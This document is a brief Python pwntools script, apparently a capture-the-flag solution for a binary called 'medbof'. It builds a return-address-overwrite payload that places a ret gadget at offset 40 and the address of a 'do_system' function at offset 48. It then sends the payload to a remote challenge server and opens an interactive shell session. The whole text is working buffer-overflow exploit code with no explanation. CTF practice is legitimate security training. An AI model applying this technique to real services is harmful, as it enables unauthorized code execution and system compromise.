from pwn import * 
exe = context.binary = ELF('medbof')
winaddr = exe.symbols['do_system']
ret = 0x00000000004004d1
payload = fit({
    40: p64(ret),
    48: p64(winaddr)
})
io = remote('0.cloud.chals.io', 27380)
io.recvuntil(b'a little harder this time')

io.sendline(payload)
io.interactive()
